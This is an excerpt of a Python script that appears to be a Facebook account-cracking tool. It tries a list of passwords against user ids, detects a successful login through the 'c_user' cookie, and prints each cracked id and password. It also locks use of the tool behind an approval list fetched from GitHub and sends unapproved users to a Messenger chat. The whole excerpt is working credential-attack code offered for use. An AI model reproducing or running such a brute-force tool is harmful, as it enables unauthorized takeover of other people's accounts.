...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mPRINCE-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [PRINCE-OK🔥] '+cid+' | '+ps+'\33[0;92m')
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/DEVIL-KING-420/aproval.txt/blob/main/Aproval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://m.facebook.com/messages/t/100044201254393")
        superuser()        
superuser()
